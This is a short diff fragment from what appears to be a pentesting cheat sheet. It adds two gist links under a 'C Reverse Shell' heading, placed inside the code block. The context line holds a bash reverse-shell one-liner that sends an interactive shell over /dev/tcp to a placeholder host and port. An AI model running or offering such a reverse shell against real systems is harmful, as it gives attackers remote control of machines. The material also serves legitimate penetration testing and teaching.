@@ -5478,6 +5478,9 @@ echo -n '/bin/bash -c "bin/bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1"' | base64
 ##### C Reverse Shell
 
 ```c
+- https://gist.github.com/loneicewolf/8232aad5722e1e7de9d92932b5a01597
+- https://gist.github.com/loneicewolf/03d71d65735d8b2d34b5c60b1232d144
+
 #include <stdarg.h>
 #include <arpa/inet.h>
 #include <stdio.h>
